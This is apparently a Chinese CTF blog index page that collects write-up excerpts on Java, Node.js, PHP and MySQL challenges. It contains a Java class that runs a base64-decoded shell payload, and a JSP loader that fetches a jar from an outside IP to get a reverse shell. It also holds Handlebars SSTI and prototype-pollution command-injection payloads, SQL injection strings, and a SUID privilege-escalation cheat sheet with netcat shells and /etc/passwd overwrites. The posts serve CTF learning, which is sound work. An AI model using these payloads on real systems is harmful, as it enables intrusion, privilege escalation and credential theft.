<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.tlif;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.UncheckedIOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">bad_class</span> </span>&#123;</span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">&quot;bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;echo xxxxx|base64 -d|sh&quot;</span>&#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;<span class="keyword">new</span> bad_class();&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来将其打包成jar包上传至服务器（记得配置java环境，不然运行不了）<br>然后上传访问该jar包的jsp木马</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.URL&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.net.URLClassLoader&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    URL url = <span class="keyword">new</span> URL(<span class="string">&quot;http://110.42.133.120/l3ctf_bp.jar&quot;</span>);</span><br><span class="line"></span><br><span class="line">    URLClassLoader ucl = <span class="keyword">new</span> URLClassLoader(<span class="keyword">new</span> URL[]&#123;url&#125;);</span><br><span class="line"></span><br><span class="line">    Class.forName(<span class="string">&quot;com.tlif.bad_class&quot;</span>,<span class="keyword">true</span>,ucl);</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>接下来访问jsp文件，即可反弹shell</p>
<h2 id="fastjson"><a href="#fastjson" class="headerlink" title="fastjson"></a>fastjson</h2><p>比赛的时候看都看没看的一道题，所以贴一下别人的wp收藏一下</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/11/11/bsides-ahmedabad-ctf-2021-0/">bsides-ahmedabad-ctf-2021</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-11-11</time><div class="content"><h2 id="pugpug"><a href="#pugpug" class="headerlink" title="pugpug"></a>pugpug</h2><p> 根据大师傅的wp，这题是原型链污染，但是我没看出来，所以认为还是应该回去理解一下，什么情景下会造成原型链污染？</p>
<h3 id="原型链污染形成原因"><a href="#原型链污染形成原因" class="headerlink" title="原型链污染形成原因"></a>原型链污染形成原因</h3><p><strong>如果可以控制并修改一个对象的原型，那么将可以影响所有和对象来自同一个类、父、组类的对象</strong></p>
<h3 id="什么时候可以利用"><a href="#什么时候可以利用" class="headerlink" title="什么时候可以利用"></a>什么时候可以利用</h3><p><strong>存在可控的对象键值</strong></p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>参数传入将经过deparam进行处理</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> input = deparam(req.originalUrl.slice(<span class="number">2</span>));</span><br></pre></td></tr></table></figure>

<p>在deparam中存在原型链污染，主要在下面这段代码，如果你传入了一个数组，含有多个键，那么就会进入以下循环进行赋值，我们可以跟一下值来分析一下</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">keys_last = keys.length - <span class="number">1</span>;                    </span><br><span class="line"><span class="keyword">for</span> ( ; i &lt;= keys_last; i++ ) &#123;</span><br><span class="line">                      key = keys[i] === <span class="string">&#x27;&#x27;</span> ? cur.length : keys[i];</span><br><span class="line">                      <span class="built_in">console</span>.log(key[i]);</span><br><span class="line">                      cur = cur[key] = i &lt; keys_last</span><br><span class="line">                      ? cur[key] || ( keys[i+<span class="number">1</span>] &amp;&amp; <span class="built_in">isNaN</span>( keys[i+<span class="number">1</span>] ) ? &#123;&#125; : [] )</span><br><span class="line">                      : val;</span><br><span class="line">                  &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到keys的数组的值分成了三部分:<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211112134020.png" alt="img"></p>
<p>再往下继续调试此时key分为三部分，cur为含有所有键以及其值是一个对象，当key为constructor，他就会向上继承去获取其constructor的值<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211112135929.png" alt="img"></p>
<p><strong>constructor属性的含义</strong>就是指向该对象的构造函数，所有函数（此时看成对象了）最终的构造函数都指向Function，而saasa是一个string，那么就是指向获得了一个string()，而所有函数的constructor都指向Function，也就是最原始的那个<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211112140206.png" alt="img"></p>
<p>而在这个Function()下面又有很多的函数，可以发现有一个正则表达式，也就是过滤我们字符的函数，我们可以通过污染这个正则表达式，来实现绕过，可以看到此时的三部分,cur[key]的值已经为那个正则表达式的内容了<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211112140336.png" alt="img" style="zoom:67%;"></p>
<p>最后直接将这个正则表达式赋值为我们传入的污染数据:<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211112140516.png" alt="img" style="zoom:67%;"></p>
<p><strong>梳理一下代码逻辑：</strong>如果我们传入一个数组数据，那么他会递归取值并进行重新赋值，直到最后一个值被赋出</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">传入:test=aaa&amp;test[<span class="keyword">constructor</span>][SafetifyRegExp]=ssss</span><br><span class="line">过程:cur=&#123;name:xxx,<span class="attr">test</span>:xxx&#125;</span><br><span class="line">cur=cur[test]=&gt;cur=aaa</span><br><span class="line">cur=cur[<span class="keyword">constructor</span>]=&gt;aaa[<span class="keyword">constructor</span>]=string()</span><br><span class="line">cur=cur[SafetifyRegExp]=&gt;string()[SafetifyRegExp]=正则表达式</span><br><span class="line">此时数组递归遍历结束，进行赋值</span><br><span class="line">string()[SafetifyRegExp]=ssss</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211112142528.png" alt="img" style="zoom:67%;">

<h3 id="模板注入"><a href="#模板注入" class="headerlink" title="模板注入"></a>模板注入</h3><p>接下来就是pug的模板注入了，想要直接getshell是没办法的因为他过滤得很严格而且我们无法绕过:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const denylist &#x3D; [&quot;%&quot;,&quot;(&quot;,&quot;global&quot;, &quot;process&quot;,&quot;mainModule&quot;,&quot;require&quot;,&quot;child_process&quot;,&quot;exec&quot;,&quot;\&quot;&quot;,&quot;&#39;&quot;,&quot;!&quot;,&quot;&#96;&quot;,&quot;:&quot;,&quot;-&quot;,&quot;_&quot;];</span><br></pre></td></tr></table></figure>

<p>但是在/serverstatus中有命令执行，并且这里可以传入参数，即req，res，但是由于options.options写死了，导致这里的命令是执行不了的，因为直接timeout500了==，所以我们先接触他，然后再控制options.args实现命令执行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">app.get(&#39;&#x2F;serverstatus&#39;, (req, res) &#x3D;&gt; &#123;</span><br><span class="line">	const result &#x3D; child_process.spawnSync(&#39;ps&#39; , options.args, options.options);</span><br><span class="line">	out &#x3D; result.stdout.toString();</span><br><span class="line">	res.send(out);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>首先我们要让childe_process.spawnSync可以执行shell命令，所以需要打开这个模式，是要用<strong>url编码</strong>即可绕过:的过滤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">%23&#123;options.options.shell%3Dtrue&#125;</span><br></pre></td></tr></table></figure>

<p>接下来再对options.args进行重新赋值，利用name进行传参绕过引号过滤（无法像shell:true）直接传参的原因：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">?name&#x3D;cpu,args%20;cat%20&#x2F;proc&#x2F;self&#x2F;environ&amp;content&#x3D;%23&#123;options.args%3D[options.args[0],name]&#125; </span><br></pre></td></tr></table></figure>

<p>最终可以发现执行命令为:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -eo cpu,args;cat &#x2F;proc&#x2F;self&#x2F;environ</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211112145153.png" alt="img" style="zoom:67%;">

<p>由于是windows下复现的，就不演示了</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/11/09/2021%E9%99%87%E5%8E%9F%E6%8A%97%E7%96%AB/">2021陇原抗疫</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-11-09</time><div class="content"><h2 id="eaaaasyphp"><a href="#eaaaasyphp" class="headerlink" title="eaaaasyphp"></a>eaaaasyphp</h2><p>一开始眼睛只看到hint了，疯狂试绕wakeup，发现没反应，才知道原来是php7.2版本的，要利用其他地方的类读bypass</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$a=<span class="keyword">new</span> Esle();</span><br><span class="line">$b=<span class="keyword">new</span> Bypass();</span><br><span class="line">$b-&gt;str4=<span class="string">&#x27;phpinfo&#x27;</span>;</span><br><span class="line">$a-&gt;c=$b;</span><br><span class="line"><span class="keyword">echo</span> serialize($a);</span><br></pre></td></tr></table></figure>

<p>发现api服务是<code>fastcgi</code>，</p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/11/07/2021%E9%A6%99%E5%B1%B1%E6%9D%AF/">mysql8.0新特性深入详解</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-11-07</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近打比赛遇到很多场都和mysql8.0有关的，然后看到网上关于这个知识点的文章也没有很多，于是决定好好总结一下。</p>
<h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>本地一直用的就是mysql8.0，所以就没改了，然后题目的话直接使用sqlilabs靶场即可</p>
<h2 id="table"><a href="#table" class="headerlink" title="table"></a>table</h2><p>table是mysql新推出的一个查询功能，可以说是select的替代，虽然功能比select差点</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TABLE table_name [ORDER BY column_name] [LIMIT number [OFFSET number]]</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">eg:</span><br><span class="line">table users;</span><br><span class="line">table users order by username</span><br><span class="line">table users order by username limit 0,1;</span><br></pre></td></tr></table></figure>

<p><strong>可以发现table显示的是整个users表的内容</strong><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211108125716.png" alt="img"><br><strong>它还可以添加参数，使得表数据的显示方式变得多元化一些</strong><br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211108130053.png" alt="img" style="zoom:67%;"></p>
<p><strong>如果只需要某一行，还可以添加limit函数进行截取</strong><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211108125916.png" alt="img" style="zoom:67%;"></p>
<h3 id="实战："><a href="#实战：" class="headerlink" title="实战："></a>实战：</h3><h4 id="1-和union组合"><a href="#1-和union组合" class="headerlink" title="1.和union组合"></a><code>1.和union组合</code></h4><p>可以直接和union组合构成万能密码，在有回显的题目当中，也可以直接用来查表的数据，但是由于无法使用group_concat()所以只能利用limit，一个个截取得到</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">-1&#39;union table users limit 0,1--+</span><br></pre></td></tr></table></figure>

 <img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211108132721.png" alt="img" style="zoom:67%;">
<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211108132725.png" alt="img" style="zoom:67%;">

<h4 id="2-无列名盲注"><a href="#2-无列名盲注" class="headerlink" title="2.无列名盲注"></a><code>2.无列名盲注</code></h4><p>当题目过滤了select和常用的infor表时，我们可以使用table还有mysql.innodb_table_stats进行替换</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">table mysql.innodb_table_stats</span><br></pre></td></tr></table></figure>

<p>此时我们即可查询得到表名<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211108133508.png" alt="img" style="zoom:67%;"></p>
<p><strong>而在table中的盲注和普通的盲注不太一样，它是按位截取对比的</strong></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/11/01/2021%E4%B8%9C%E5%8D%8E%E6%9D%AF/">2021东华杯</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-11-01</time><div class="content"><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>比赛那天体侧==人傻了，后面也没心情做，但是感觉比赛的题都是可以学习的，可惜没想到环境马上就关了–</p>
<h2 id="apacheprOxy"><a href="#apacheprOxy" class="headerlink" title="apacheprOxy"></a>apacheprOxy</h2><p>附近是一个docker文件，发现是GKCTF2021的原题（简化版）,这里主要学习一下学长的工具试试看</p>
<p>首先使用扫描器扫描链接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 ws.py -t xx.xx.xx.xx</span><br></pre></td></tr></table></figure>

<p>然后使用工具一键getshell</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python cve-2020-14882_rce.py -u http:&#x2F;&#x2F;127.0.0.1:7001 -c whoami</span><br></pre></td></tr></table></figure>

<h2 id="eznode"><a href="#eznode" class="headerlink" title="eznode"></a>eznode</h2><p>看看能不能本地起一个跑一下看看<br>配置过程，首先出现了第一个问题:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#39;const&#39; is available in ES6 (use &#39;esversion: 6&#39;) or Mozilla JS extensions (use moz). (W104)</span><br></pre></td></tr></table></figure>

<p>查到解决方法是:在开头添加一个</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*jshint esversion: 6 *&#x2F;</span><br></pre></td></tr></table></figure>

<p>然后一直说找不到module，install了很多次，发现需要cd到那个项目目录下去install这些模块</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">npm install</span><br></pre></td></tr></table></figure>

<p>由于前面的登录部分需要麻烦的数据库之类的配置，所以我就直接进入到upload的路由，并删除校验的部分了<br>查看package.json，一个一个查漏洞（积累下）</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;name&quot;: &quot;app&quot;,</span><br><span class="line">  &quot;version&quot;: &quot;0.0.0&quot;,</span><br><span class="line">  &quot;private&quot;: true,</span><br><span class="line">  &quot;scripts&quot;: &#123;</span><br><span class="line">    &quot;start&quot;: &quot;node .&#x2F;bin&#x2F;www&quot;,</span><br><span class="line">    &quot;dev&quot;: &quot;nodemon index.js -e js&quot;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;dependencies&quot;: &#123;</span><br><span class="line">    &quot;cookie-parser&quot;: &quot;~1.4.4&quot;,</span><br><span class="line">    &quot;crypto&quot;: &quot;^1.0.1&quot;,</span><br><span class="line">    &quot;debug&quot;: &quot;~2.6.9&quot;,</span><br><span class="line">    &quot;express&quot;: &quot;~4.16.1&quot;,</span><br><span class="line">    &quot;hbs&quot;: &quot;^4.0.1&quot;,</span><br><span class="line">    &quot;http-errors&quot;: &quot;~1.6.3&quot;,</span><br><span class="line">    &quot;morgan&quot;: &quot;~1.9.1&quot;,</span><br><span class="line">    &quot;multer&quot;: &quot;^1.4.3&quot;,</span><br><span class="line">    &quot;mysql&quot;: &quot;^2.18.1&quot;,</span><br><span class="line">    &quot;path&quot;: &quot;^0.12.7&quot;,</span><br><span class="line">    &quot;sequelize&quot;: &quot;^6.7.0&quot;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现hbs的模板渲染有一个CVE-2021-32822<br>参考文章:<br><a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs">https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#handlebars-nodejs</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;#with &quot;s&quot; as |string|&#125;&#125;</span><br><span class="line">  &#123;&#123;#with &quot;e&quot;&#125;&#125;</span><br><span class="line">    &#123;&#123;#with split as |conslist|&#125;&#125;</span><br><span class="line">      &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">      &#123;&#123;this.push (lookup string.sub &quot;constructor&quot;)&#125;&#125;</span><br><span class="line">      &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">      &#123;&#123;#with string.split as |codelist|&#125;&#125;</span><br><span class="line">        &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">        &#123;&#123;this.push &quot;return require(&#39;child_process&#39;).exec(&#39;whoami&#39;);&quot;&#125;&#125;</span><br><span class="line">        &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">        &#123;&#123;#each conslist&#125;&#125;</span><br><span class="line">          &#123;&#123;#with (string.sub.apply 0 codelist)&#125;&#125;</span><br><span class="line">            &#123;&#123;this&#125;&#125;</span><br><span class="line">          &#123;&#123;&#x2F;with&#125;&#125;</span><br><span class="line">        &#123;&#123;&#x2F;each&#125;&#125;</span><br><span class="line">      &#123;&#123;&#x2F;with&#125;&#125;</span><br><span class="line">    &#123;&#123;&#x2F;with&#125;&#125;</span><br><span class="line">  &#123;&#123;&#x2F;with&#125;&#125;</span><br><span class="line">&#123;&#123;&#x2F;with&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;&#123;#with &quot;s&quot; as |string|&#125;&#125;</span><br><span class="line">  &#123;&#123;#with &quot;e&quot;&#125;&#125;</span><br><span class="line">    &#123;&#123;#with split as |conslist|&#125;&#125;</span><br><span class="line">      &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">      &#123;&#123;this.push (lookup string.sub &quot;constructor&quot;)&#125;&#125;</span><br><span class="line">      &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">      &#123;&#123;#with string.split as |codelist|&#125;&#125;</span><br><span class="line">        &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">        &#123;&#123;this.push &quot;return process.mainModule.require(&#39;child_process&#39;).execSync(&#39;cat &#x2F;flag&#39;).toString();&quot;&#125;&#125;</span><br><span class="line">        &#123;&#123;this.pop&#125;&#125;</span><br><span class="line">        &#123;&#123;#each conslist&#125;&#125;</span><br><span class="line">          &#123;&#123;#with (string.sub.apply 0 codelist)&#125;&#125;</span><br><span class="line">            &#123;&#123;this&#125;&#125;</span><br><span class="line">          &#123;&#123;&#x2F;with&#125;&#125;</span><br><span class="line">        &#123;&#123;&#x2F;each&#125;&#125;</span><br><span class="line">      &#123;&#123;&#x2F;with&#125;&#125;</span><br><span class="line">    &#123;&#123;&#x2F;with&#125;&#125;</span><br><span class="line">  &#123;&#123;&#x2F;with&#125;&#125;</span><br><span class="line">&#123;&#123;&#x2F;with&#125;&#125;</span><br></pre></td></tr></table></figure>

<h2 id="OldLibrary"><a href="#OldLibrary" class="headerlink" title="OldLibrary"></a>OldLibrary</h2><p>这里就记录一下</p>
<h3 id="Linux-SUID-提权"><a href="#Linux-SUID-提权" class="headerlink" title="Linux SUID 提权"></a>Linux SUID 提权</h3><h4 id="关于suid"><a href="#关于suid" class="headerlink" title="关于suid"></a>关于suid</h4><p>suid是赋予文件的一种权限<br>具体叙述可以参考:<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sparkdev/p/9651622.html">https://www.cnblogs.com/sparkdev/p/9651622.html</a><br>总结来说就是:当一个二进制可执行文件具有suid权限时，尽管不是root用户也可以执行本该root用户才能执行的功能</p>
<h4 id="查找suid权限位文件"><a href="#查找suid权限位文件" class="headerlink" title="查找suid权限位文件"></a>查找suid权限位文件</h4><p>下命令可以找到正在系统上运行的所有SUID可执行文件。准确的说，这个命令将从/目录中查找具有SUID权限位且属主为root的文件并输出它们，然后将所有错误重定向到/dev/null，从而仅列出该用户具有访问权限的那些二进制文件。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null</span><br><span class="line">find &#x2F; -user root -perm -4000 -exec ls -ldb &#123;&#125; ;</span><br></pre></td></tr></table></figure>

<p>也可以使用 <code>sudo -l</code> 命令列出当前用户可执行的命令</p>
<h4 id="常用提权方式"><a href="#常用提权方式" class="headerlink" title="常用提权方式"></a>常用提权方式</h4><p>nmap（2.02-5.21）存在交换模式，可利用提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap --interactive</span><br></pre></td></tr></table></figure>

<p>之后执行:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap&gt; !sh</span><br><span class="line">sh-3.2# whoami</span><br><span class="line">root</span><br></pre></td></tr></table></figure>

<p>msf中的模块为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exploit&#x2F;unix&#x2F;local&#x2F;setuid_nmap</span><br></pre></td></tr></table></figure>

<p>较新版可使用 <code>--script</code> 参数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo &quot;os.execute(&#39;&#x2F;bin&#x2F;sh&#39;)&quot; &gt; &#x2F;tmp&#x2F;shell.nse &amp;&amp; sudo nmap --script&#x3D;&#x2F;tmp&#x2F;shell.nse</span><br></pre></td></tr></table></figure>

<h4 id="find"><a href="#find" class="headerlink" title="find"></a>find</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">touch test</span><br><span class="line">find test -exec whoami \;</span><br></pre></td></tr></table></figure>

<p>nc 反弹 shell：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find test -exec netcat -lvp 5555 -e &#x2F;bin&#x2F;sh \;</span><br></pre></td></tr></table></figure>

<h4 id="2-3-vi-vim"><a href="#2-3-vi-vim" class="headerlink" title="2.3 vi/vim"></a>2.3 vi/vim</h4><p>打开vim,按下ESC</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">:set shell&#x3D;&#x2F;bin&#x2F;sh</span><br><span class="line">:shell</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo vim -c &#39;!sh&#39;</span><br></pre></td></tr></table></figure>

<h4 id="2-4-bash"><a href="#2-4-bash" class="headerlink" title="2.4 bash"></a>2.4 bash</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bash -p</span><br><span class="line">bash-3.2# id</span><br><span class="line">uid&#x3D;1002(service) gid&#x3D;1002(service) euid&#x3D;0(root) groups&#x3D;1002(service)</span><br></pre></td></tr></table></figure>

<h4 id="2-5-less"><a href="#2-5-less" class="headerlink" title="2.5 less"></a>2.5 less</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">less &#x2F;etc&#x2F;passwd</span><br><span class="line">!&#x2F;bin&#x2F;sh</span><br></pre></td></tr></table></figure>

<h4 id="2-6-more"><a href="#2-6-more" class="headerlink" title="2.6 more"></a>2.6 more</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">more &#x2F;home&#x2F;pelle&#x2F;myfile</span><br><span class="line">!&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<h4 id="2-7-cp"><a href="#2-7-cp" class="headerlink" title="2.7 cp"></a>2.7 cp</h4><p>覆盖 <code>/etc/shadow</code> 或 <code>/etc/passwd</code></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[zabbix@localhost ~]$ cat &#x2F;etc&#x2F;passwd &gt;passwd</span><br><span class="line">2.[zabbix@localhost ~]$ openssl passwd -1 -salt hack hack123</span><br><span class="line">3.$1$hack$WTn0dk2QjNeKfl.DHOUue0</span><br><span class="line">4.[zabbix@localhost ~]$ echo &#39;hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::&#x2F;root&#x2F;:&#x2F;bin&#x2F;bash&#39; &gt;&gt; passwd</span><br><span class="line">5.[zabbix@localhost ~]$ cp passwd &#x2F;etc&#x2F;passwd</span><br><span class="line">6.[zabbix@localhost ~]$ su - hack</span><br><span class="line">7.Password:</span><br><span class="line">8.[root@361way ~]# id</span><br><span class="line">9.uid&#x3D;0(hack) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">10.[root@361way ~]# cat &#x2F;etc&#x2F;passwd|tail -1</span><br><span class="line">11.hack:$1$hack$WTn0dk2QjNeKfl.DHOUue0:0:0::&#x2F;root&#x2F;:&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<h4 id="2-8-mv"><a href="#2-8-mv" class="headerlink" title="2.8 mv"></a>2.8 mv</h4><p>覆盖 <code>/etc/shadow</code> 或 <code>/etc/passwd</code></p>
<h4 id="2-9-nano"><a href="#2-9-nano" class="headerlink" title="2.9 nano"></a>2.9 nano</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nano  &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<h4 id="2-10-awk"><a href="#2-10-awk" class="headerlink" title="2.10 awk"></a>2.10 awk</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">awk &#39;BEGIN &#123;system(&quot;&#x2F;bin&#x2F;sh&quot;)&#125;&#39;</span><br></pre></td></tr></table></figure>

<h4 id="2-11-man"><a href="#2-11-man" class="headerlink" title="2.11 man"></a>2.11 man</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">man passwd</span><br><span class="line">!&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>

<h4 id="2-12-wget"><a href="#2-12-wget" class="headerlink" title="2.12 wget"></a>2.12 wget</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wget http:&#x2F;&#x2F;192.168.56.1:8080&#x2F;passwd -O &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>

<h4 id="2-13-apache"><a href="#2-13-apache" class="headerlink" title="2.13 apache"></a>2.13 apache</h4><p>仅可查看文件，不能弹 shell：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">apache2 -f &#x2F;etc&#x2F;shadow</span><br></pre></td></tr></table></figure>

<h4 id="2-14-tcpdump"><a href="#2-14-tcpdump" class="headerlink" title="2.14 tcpdump"></a>2.14 tcpdump</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo $&#39;id\ncat &#x2F;etc&#x2F;shadow&#39; &gt; &#x2F;tmp&#x2F;.test</span><br><span class="line">chmod +x &#x2F;tmp&#x2F;.test</span><br><span class="line">sudo tcpdump -ln -i eth0 -w &#x2F;dev&#x2F;null -W 1 -G 1 -z &#x2F;tmp&#x2F;.test -Z root</span><br></pre></td></tr></table></figure>

<h4 id="2-15-python-perl-ruby-lua-php-etc"><a href="#2-15-python-perl-ruby-lua-php-etc" class="headerlink" title="2.15 python/perl/ruby/lua/php/etc"></a>2.15 python/perl/ruby/lua/php/etc</h4><p>python</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -c &quot;import os;os.system(&#39;&#x2F;bin&#x2F;bash&#39;)&quot;</span><br></pre></td></tr></table></figure>

<p>perl</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exec &quot;&#x2F;bin&#x2F;bash&quot;;</span><br></pre></td></tr></table></figure>

<p>就测试了一下vi的，发现还挺神奇的</p>
<p>原作者用得是</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null #查找系统上运行的所有SUID可执行文件</span><br><span class="line">comm &#x2F;flagggisshere &#x2F;dev&#x2F;null 2&gt; &#x2F;dev&#x2F;null</span><br></pre></td></tr></table></figure>

<img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211101213906.png" alt="img" style="zoom:67%;">

<p>参考：<a target="_blank" rel="noopener" href="http://www.snowywar.top/?p=2743">http://www.snowywar.top/?p=2743</a></p>
</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/10/31/2021hack-lu/">2021hack.lu</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-10-31</time><div class="content"><h2 id="Diamond-Safe"><a href="#Diamond-Safe" class="headerlink" title="Diamond Safe"></a>Diamond Safe</h2><p>下载源码:</p>
<p><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211031103819.png" alt="img"></p>
<p>虽然存在过滤函数<br><img src="https://raw.githubusercontent.com/Hwwg/myphoto/master/20211103210956.png" alt="img" style="zoom:67%;"></p>
